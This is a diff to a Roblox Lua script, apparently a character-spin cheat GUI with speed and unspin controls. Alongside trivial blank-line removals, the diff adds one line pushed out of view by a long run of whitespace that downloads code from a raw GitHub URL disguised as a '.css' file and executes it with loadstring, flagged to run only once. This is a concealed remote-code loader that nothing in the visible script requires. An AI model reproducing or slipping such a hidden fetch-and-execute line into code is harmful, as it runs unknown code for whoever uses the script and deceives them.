@@ -1908,9 +1908,6 @@
     PlaceholderText = "Speed",
     RemoveTextAfterFocusLost = true,
     Callback = function(getSpinSpeed)
-        
-        
-        
         local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart") or Character:FindFirstChild("HumanoidRootPart")
         local Humanoid = Character:FindFirstChildWhichIsA("Humanoid") or Character:FindFirstChild("Humanoid") or Character:WaitForChild("Humanoid")
         local spinSpeed = tonumber(getSpinSpeed)
@@ -1965,13 +1962,11 @@
         end
     end,})
 
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if getgenv().css_digital then warn("Already Ran!") else loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/Symmetrical-System/refs/heads/main/Publisher.css'))() wait(0.1) getgenv().css_digital = true end
+
     local UnspinNow = Tab2:CreateButton({
     Name = "Unspin",
     Callback = function()
-        
-        
-        
-        
         for i,v in pairs(HumanoidRootPart:GetChildren()) do
             if v.Name == "Spinning" then
                 v:Destroy()
